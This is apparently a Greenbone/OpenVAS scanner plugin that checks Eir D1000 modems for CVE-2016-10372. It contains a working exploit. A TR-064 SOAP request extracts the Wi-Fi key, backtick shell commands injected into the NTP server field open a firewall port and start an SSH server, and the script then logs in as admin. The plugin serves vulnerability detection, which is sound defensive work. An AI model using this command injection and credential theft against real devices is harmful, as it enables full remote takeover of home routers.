CPE = "cpe:/a:allegrosoft:rompager";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140054" );
	script_version( "2021-09-17T12:01:50+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-2016-10372" );
	script_name( "Eir D1000 Modem CWMP Remote Command Execution" );
	script_xref( name: "URL", value: "https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/" );
	script_tag( name: "vuldetect", value: "Try to open a port in the firewall then start a ssh server on this port and try to login." );
	script_tag( name: "insight", value: "By sending certain TR-064 commands, scaner can instruct the modem to open a port on the firewall
  and to start a ssh server on this port. This allows ssh access to the modem. The default login password for the D1000 is the Wi-Fi password.
  This is easily obtained with another TR-064 command." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the product
  by another one." );
	script_tag( name: "summary", value: "The Eir D1000 Modem has bugs that allow an attacker to gain full control of the modem from the Internet." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "last_modification", value: "2021-09-17 12:01:50 +0000 (Fri, 17 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-12-19 02:29:00 +0000 (Tue, 19 Dec 2017)" );
	script_tag( name: "creation_date", value: "2016-11-11 10:15:15 +0100 (Fri, 11 Nov 2016)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_dependencies( "gb_allegro_rompager_detect.sc", "gb_default_credentials_options.sc" );
	script_require_ports( "Services/www", 7547 );
	script_mandatory_keys( "allegro/rompager/detected" );
	script_exclude_keys( "default_credentials/disable_default_account_checks" );
	exit( 0 );
}
if(get_kb_item( "default_credentials/disable_default_account_checks" )){
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("ssh_func.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
func run_cmd( cmd, port ){
	var buf, cmd, port;
	xml = "<?xml version=\"1.0\"?>
 <SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
  <SOAP-ENV:Body>
   <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">
    <NewNTPServer1>" + cmd + "</NewNTPServer1>
    <NewNTPServer2></NewNTPServer2>
    <NewNTPServer3></NewNTPServer3>
    <NewNTPServer4></NewNTPServer4>
    <NewNTPServer5></NewNTPServer5>
   </u:SetNTPServers>
  </SOAP-ENV:Body>
 </SOAP-ENV:Envelope>";
	url = "/UD/act?1";
	req = http_post_put_req( port: port, url: url, data: xml, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded", "SOAPAction", "urn:dslforum-org:service:Time:1#SetNTPServers" ) );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!IsMatchRegexp( buf, "HTTP/1\\.. 200" )){
		exit( 99 );
	}
	return;
}
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
url = "/globe";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!IsMatchRegexp( buf, "HTTP/1\\.. 404" ) || !ContainsString( buf, "home_wan.htm" )){
	exit( 99 );
}
xml = "<?xml version=\"1.0\"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
 <SOAP-ENV:Body>
  <u:GetSecurityKeys xmlns:u=\"urn:dslforum-org:service:WLANConfiguration:1\">
  </u:GetSecurityKeys>
 </SOAP-ENV:Body>
</SOAP-ENV:Envelope>";
req1 = http_post_put_req( port: port, url: "/UD/act?1", data: xml, add_headers: make_array( "Content-Type", "text/xml", "SOAPAction", "urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys" ) );
buf1 = http_keepalive_send_recv( port: port, data: req1, bodyonly: FALSE );
if(!ContainsString( buf1, "<NewPreSharedKey>" )){
	exit( 99 );
}
k = eregmatch( pattern: "<NewPreSharedKey>([^<]+)</NewPreSharedKey>", string: buf1 );
if(isnull( k[1] )){
	exit( 99 );
}
key = k[1];
nc_port = rand() % 64512 + 1024;
run_cmd( cmd: "`iptables -I INPUT -p tcp --dport " + nc_port + " -j ACCEPT`", port: port );
run_cmd( cmd: "`dropbear -p " + nc_port + "`", port: port );
sleep( 3 );
soc = open_sock_tcp( nc_port );
if(!soc){
	exit( 99 );
}
login = ssh_login( socket: soc, login: "admin", password: key, priv: NULL, passphrase: NULL );
close( soc );
run_cmd( cmd: "`iptables -I INPUT -p tcp --dport " + nc_port + " -j REJECT`", port: port );
run_cmd( cmd: "`kill -9 $(pidof dropbear)`", port: port );
run_cmd( cmd: "`dropbear`", port: port );
run_cmd( cmd: "pool.ntp.org", port: port );
if(login == 0){
	report = "By sending certain TR-064 commands, scanner was able to instruct the modem to open port `" + nc_port + "` on the firewall and to start a ssh server on this port.\n";
	report += "The default login password for the D1000 is the default Wi-Fi password `" + key + "`. This was easily obtained with another TR-064 command.\nIt was possible to login into the modem using this password for the user `admin`.";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

